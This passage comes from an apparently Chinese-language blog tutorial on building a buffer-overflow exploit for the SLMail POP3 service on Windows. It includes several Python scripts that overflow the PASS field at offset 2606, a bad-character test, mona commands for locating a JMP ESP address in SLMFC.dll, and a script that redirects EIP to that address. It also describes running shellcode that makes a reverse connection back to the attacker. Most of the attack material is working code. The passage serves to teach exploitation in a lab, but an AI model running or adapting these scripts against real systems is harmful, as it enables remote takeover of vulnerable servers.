src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220010201587.png" alt="image-20221220010201587"></p><blockquote><p>精确的匹配到2606偏移处，第2606开始就是8Di9(39694438)，8是2607偏移处</p></blockquote><h5 id="10、验证位置是否准确"><a href="#10、验证位置是否准确" class="headerlink" title="10、验证位置是否准确"></a>10、验证位置是否准确</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">2606</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">20</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''若能在EIP中精确的写入4个B，证明此位置就是溢出的位置'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220011155683.png" alt="image-20221220011155683"></p><blockquote><p>执行完脚本之后，EIP寄存器地址被修改为42424242，查看ASCII码表之后对应42—&gt;B，修改成功，此时可以任意修改EIP地址；ESP寄存器被填入20个C。</p><p>假设在ESP寄存器中填入的不是20个C，而是一串shellcode(恶意代码)，shellcode在目标服务器上开一个端口，或者主动使用nc反向连接攻击者系统的一个指定端口，此时就可以达到远程目标系统的目的。</p></blockquote><h5 id="11、写入shellcode思路"><a href="#11、写入shellcode思路" class="headerlink" title="11、写入shellcode思路"></a>11、写入shellcode思路</h5><blockquote><ul><li>思路：<ul><li>将EIP修改为shellcode代码的内存地址，将shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到shellcode代码段并执行；在写入shellcode之前，需要寻找可存放shellcode的内存空间。</li></ul></li></ul></blockquote><h5 id="12、寻找可存放shellcode的内存空间"><a href="#12、寻找可存放shellcode的内存空间" class="headerlink" title="12、寻找可存放shellcode的内存空间"></a>12、寻找可存放shellcode的内存空间</h5><blockquote><p>在ESP寄存器中尝试存放shellcode；</p><p>假设ESP寄存器可以存放3500个字符，减去前面的2610个字符后，将剩下的字符存放到ESP寄存器中，查看到底有多少个C字符可以到达ESP寄存器中，最终判断ESP寄存器的大小，从而判断是否可以放入一个shellcode代码。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">2606</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">3500</span><span class="token operator">-</span><span class="token number">2606</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>执行脚本后ESP寄存器中存放了很多C</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220154428452.png" alt="image-20221220154428452"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220154650763.png" alt="image-20221220154650763"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220155850665.png" alt="image-20221220155850665"></p><blockquote><p>点击右键Follow in Dump，接着在左下框点击Hex dump查看ESP内存空间中出现C字符，利用初始地址和结束地址计算地址空间；</p><p>起始地址：01F79210</p><p>结束地址：01F793C0</p></blockquote><p>使用科学性计算器计算地址空间为<code>1A0</code></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220160116357.png" alt="image-20221220160116357"></p><p>转换为十进制为<code>416</code></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220160155808.png" alt="image-20221220160155808"></p><blockquote><p>通常使用的较小巧的shellcode，需要300字节左右，足以存放一个shellcode；此时就可以将shellcode写入ESP寄存器，通过修改EIP寄存器内存地址的方式让程序跳转到ESP寄存器，让CPU提取ESP寄存器中的shellcode，执行shellcode连接攻击者主机达到控制目标服务器的目的。</p></blockquote><h5 id="13、测试坏字符"><a href="#13、测试坏字符" class="headerlink" title="13、测试坏字符"></a>13、测试坏字符</h5><blockquote><p>此时不能够直接写入shellcode，由于程序，协议和漏洞的不同，有些字符在缓冲区中是不能够使用的，这些字符因程序和协议的不同也会有所不同，有些协议会过滤<code>0a</code>，有些会协议过滤<code>0b</code>或者有些协议遇到<code>0c</code>程序就会崩溃，这些字符就被称为坏字符，这些坏字符是不能够出现在缓冲区中的；因此，在注入shellcode之前需要测试出所有的坏字符，否则shellcode就无法正常运行。</p><p>在POP3协议中，<code>null byte (0x00)</code>为 空字符，用于终止字符串的拷贝操作；<code>return (0x0D)</code> 回车操作，表示POP3 <code>PASS</code> 命令输入完成，这两字符在shellcode中不能使用，但还要测试其他的坏字符。</p><p>思路：</p><p>使用脚本发送0x00 — 0xff 256个字符，查找所有坏字符。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span>        <span class="token string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span>        <span class="token string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span>        <span class="token string">"\x31\x32\x33\x34\x35\x36\x37\x38\x29\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span>        <span class="token string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>        <span class="token string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>        <span class="token string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span>        <span class="token string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span>        <span class="token string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span>        <span class="token string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span>        <span class="token string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span>        <span class="token string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span>        <span class="token string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span>        <span class="token string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span>        <span class="token string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span>        <span class="token string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"</span><span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">2606</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>badchars<span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220163557557.png" alt="image-20221220163557557"></p><blockquote><p>同样右键Follow in Dump，此时ESP的内存地址为01F7A154，左下框中寻找从01F7A154起始的位置进行查看。观察发现从09开始，0a出现时后面的字符都没有了，0a字符可能是坏字符，剔除掉0a之后继续测试。</p></blockquote><p>将0a换成09再次执行脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x09\x0b\x0c\x0d\x0e\x0f\x10"</span>        <span class="token string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span>        <span class="token string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span>        <span class="token string">"\x31\x32\x33\x34\x35\x36\x37\x38\x29\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span>        <span class="token string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>        <span class="token string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>        <span class="token string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span>        <span class="token string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span>        <span class="token string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span>        <span class="token string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span>        <span class="token string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span>        <span class="token string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span>        <span class="token string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span>        <span class="token string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span>        <span class="token string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span>        <span class="token string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"</span><span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">2606</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>badchars<span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220164300762.png" alt="image-20221220164300762"></p><blockquote><p>此时替换掉0a字符之后，后面的字符都正常出现了（0d被自动过滤掉）；查看最后一列，从11开始一直到F1都正常出现；查看最后一行，从F2开始一直到FF也都正常出现。由此发现，只有<code>00，0a，0d</code>是坏字符，这三个坏字符不能作为shellcode代码写入缓冲区空间中。</p></blockquote><h5 id="14、重定向思路"><a href="#14、重定向思路" class="headerlink" title="14、重定向思路"></a>14、重定向思路</h5><blockquote><ul><li><p>ESP的地址是变化的，硬编码不可行，SLMail 是基于线程的应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定。</p></li><li><p>变通思路，使用间接的方法，在内存中寻找地址固定的系统模块，系统模块中有大量的指令，在模块中寻找 <code>JMP ESP</code>(汇编)指令(意思是跳到ESP地址)的地址，再由该指令间接跳转到 ESP，从而执行shellcode；<strong>简单来说就是：在EIP中存放那个内存地址固定不变的系统模块中的<code>JMP ESP</code>指令的内存地址，再由<code>JMP ESP</code>指令跳到ESP，执行ESP中的shellcode。</strong></p></li></ul></blockquote><h5 id="15、寻找地址固定不变的系统模块"><a href="#15、寻找地址固定不变的系统模块" class="headerlink" title="15、寻找地址固定不变的系统模块"></a>15、寻找地址固定不变的系统模块</h5><p>在最下方的方框中执行mona脚本，输入<code>!mona modules</code>查找系统中正在运行的所有模块</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220170740366.png" alt="image-20221220170740366"></p><blockquote><p>重点关注Rebase一列，表示操作系统重启，重启之后内存地址是否发生变化，若发生变化就是True，不发生变化就是False。SafeSEH，ASLR和NXCompat这三列都是操作系统默认内存保护机制，所以需要选择不受内存保护机制保护的系统模块；若是受保护模块，每次重启都是随机地址，无法利用shellcode；最后一列，OS Dll(OS动态链接库)必须选择True，选择操作系统自带的库。前四列都是False，最后一列是True。</p></blockquote><p>图中第一个符合要求的模块，然后查找这个模块中是否存在JMP ESP的指令，如果没有就利用不了这个模块</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220172118829.png" alt="image-20221220172118829"></p><p>由于<code>JMP ESP</code>汇编指令所对应的二进制，使用kali metasploit下的nasm_shell.rb将汇编指令转换为二进制</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit.&#x2F;nasm_shell.rb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220172811929.png" alt="image-20221220172811929"></p><p>使用<code>!mona find -s &quot;\xff\xe4&quot; -m openc32.dll</code>查找</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220172937075.png" alt="image-20221220172937075"></p><blockquote><p>这个模块没有找到执行JMP ESP指令的代码。</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220173235175.png" alt="image-20221220173235175"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220173306849.png" alt="image-20221220173306849"></p><blockquote><p>还剩下最后两个符合模块可以使用</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220173407616.png" alt="image-20221220173407616"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220173450081.png" alt="image-20221220173450081"></p><blockquote><p>从SLMFC.dll模块中找到了19个可利用的地址（第一列表示地址）</p></blockquote><p>双击第一个地址，并且右键使其进行汇编的显示进行查看</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220173840830.png" alt="image-20221220173840830"></p><blockquote><p>第一个就是<code>JMP ESP</code>的地址</p></blockquote><p>点击工具栏中的<code>m</code>打开内存地图，其中<code>SLMFC.dll</code>的基地址为<code>5f400000</code>，查看内存地图寻找此基地址</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220175814989.png" alt="image-20221220175814989"></p><blockquote><p>这是个PE的执行程序头，text段是个code代码。因为SLMail是不支持DEP（DEP：阻止代码从数据页被执行）和ASLR（ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化）的内存保护机制的，因此我们可以19个地址中随便选一个进行跳转。如果这个程序支持DEP，那么Map中Access列的权限必须为R(可读)E(可执行)，否则受DEP保护将不能正确执行跳转。</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220180226470.png" alt="image-20221220180226470"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220180309206.png" alt="image-20221220180309206"></p><blockquote><p>右键Breakpoint-&gt;Memory，on access进行断点调试，之后点击工具栏运行；（只要访问到这个地址程序就会中断）</p></blockquote><p>设置断点为了让python的脚本向程序发送溢出的代码，看溢出的代码在跑到这个断点时是否被正确的跳转，验证它能否真正实现跳转</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">2606</span><span class="token operator">+</span><span class="token string">"\xe3\x41\x4b\x5f"</span><span class="token operator">+</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">390</span>  <span class="token comment"># 将地址存入EIP寄存器（地址需要反转）</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220181327646.png" alt="image-20221220181327646"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220181338345.png" alt="image-20221220181338345"></p><blockquote><p>程序已经运行到断点，终止运行；此时EIP已经写入5F4B41E3</p></blockquote><p>跳转到上一步Step into</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220181619115.png" alt="image-20221220181619115"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220181738558.png" 